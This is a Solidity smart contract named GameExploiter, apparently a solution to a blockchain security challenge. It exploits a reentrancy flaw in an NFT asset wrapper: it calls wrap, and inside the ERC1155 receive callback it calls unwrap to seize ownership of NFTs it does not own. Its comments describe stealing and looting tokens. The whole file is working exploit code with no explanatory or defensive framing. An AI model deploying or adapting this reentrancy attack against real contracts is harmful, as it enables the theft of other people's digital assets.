//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol";


interface IERC721 {
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
}

interface IAssetWrapper {
    function wrap(
        uint256 nftId,
        address assetOwner,
        address assetAddress
    ) external;
    function unwrap(
        address assetOwner,
        address assetAddress
    ) external;
}

/// @dev exploiter contract
contract GameExploiter is ERC1155Receiver {

    IAssetWrapper wrapper;
    address nftAddress; // address of current NFT being looted
    address attacker; // where to send swiped NFTs

    constructor(address wrapperAddress) {
        wrapper = IAssetWrapper(wrapperAddress);
        attacker = msg.sender;
    }

    /// @dev run the exploit
    function runExploit(
        uint256 nftId, // NFT id to steal
        address assetAddress // NFT address to steal from
    ) external {
        nftAddress = assetAddress; // save state
        wrapper.wrap(nftId, address(this), assetAddress);
    }

    /// @dev callback during mint
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external override returns (bytes4) {
        require(msg.sender == address(wrapper), "invalid callback");

        wrapper.unwrap(address(this), nftAddress); // change ownership to this contract

        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external override returns (bytes4) {
        return bytes4(0); // not accepted
    }

}